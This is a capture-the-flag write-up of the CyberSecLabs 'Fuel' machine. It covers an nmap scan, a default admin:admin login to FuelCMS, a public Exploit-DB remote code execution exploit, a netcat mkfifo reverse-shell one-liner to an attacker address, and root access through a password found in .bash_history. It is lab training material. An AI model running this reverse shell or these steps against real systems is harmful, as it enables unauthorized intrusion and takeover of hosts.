---
layout: page
title: Fuel - CyberSecLabs
permalink: /posts/ctf/cyberseclabs/fuel.html
---

# Fuel - CyberSecLabs
----



First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.28`

![image](https://user-images.githubusercontent.com/50459517/109032719-8d6a0780-768b-11eb-8e02-5ee7469b6f5f.png)

Lets check out port 80

![image](https://user-images.githubusercontent.com/50459517/109032751-95c24280-768b-11eb-9478-df37555e46c1.png)

Looks like we have FuelCMS here.  According to the robots.txt results from the nmap scan, /fuel is disallowed for serach engines so lets go there and see what we can find.

![image](https://user-images.githubusercontent.com/50459517/109032788-9eb31400-768b-11eb-83cc-41029f30987a.png)

We have a login, first thing I like to do is try default logins and sure enough **admin:admin** worked.

![image](https://user-images.githubusercontent.com/50459517/109032835-a7a3e580-768b-11eb-8481-2aed5d2cb39d.png)

Nice, after looking around for a while I couldn't figure anything out to exploit this further from the admin panel so I decided to look up some potential exploits for this version and found the following.

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/47138)

This is a RCE vuln that sends the malicious url with the command we want to send to the server.  It loops so we can send endless commands as long as we have connection.  It also forwards to a proxy like burp which we could simply remove but I decided to keep during the testing.

I admit, I got stuck on this for a while thinking it wouldn't work, trying to move to a different path thinking this exploit is broken before coming back.  When I first ran the exploit, I first ran **whoami** like this.

![image](https://user-images.githubusercontent.com/50459517/109032878-b38fa780-768b-11eb-925d-a393cf2f5677.png)

So I sent to Repeater and got this response.

![image](https://user-images.githubusercontent.com/50459517/109032909-be4a3c80-768b-11eb-93fb-43d06335e8d7.png)

I saw the **systemmoira** and thought yeah they looks like the return to the command I issued.  I then decided to modify the request within burp to issue the command **id**

![image](https://user-images.githubusercontent.com/50459517/109032940-c73b0e00-768b-11eb-8dc9-8b69d56c2403.png)

But I got the same outcome... Everytime I came back to this exploit, just knowing this was the path onto the machine, but just couldn't get it to work.

Then after just turning intercept off of burp and trying the command I saw the output I needed from the command window

![image](https://user-images.githubusercontent.com/50459517/109032980-d02bdf80-768b-11eb-908a-a5bee4f54880.png)

Finally!  Now that I ran a few different commands such as **pwd** and **ls -l** and got different results I knew I was on the right track.  Not sure why I was getting weird results through brup but either way I moved on.

I used the netcat reverse shell one liner below to get a shell onto the machine.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.11 1234 >/tmp/f`

![image](https://user-images.githubusercontent.com/50459517/109033027-d8841a80-768b-11eb-873e-af96aa1c6646.png)

Now time to copy over LinPEAS and see what we can find

![image](https://user-images.githubusercontent.com/50459517/109033069-e33eaf80-768b-11eb-864e-3af9e5b8198e.png)

I found the output of **.bash_history** to be interesting.  We see the password for moira.  I tried a few things such as **sudo -l** but ended up finding that the root password is the same as moira's.  So a simple **su root** is all that is needed.

![image](https://user-images.githubusercontent.com/50459517/109033115-eb96ea80-768b-11eb-8bf2-b21c37ad0d08.png)
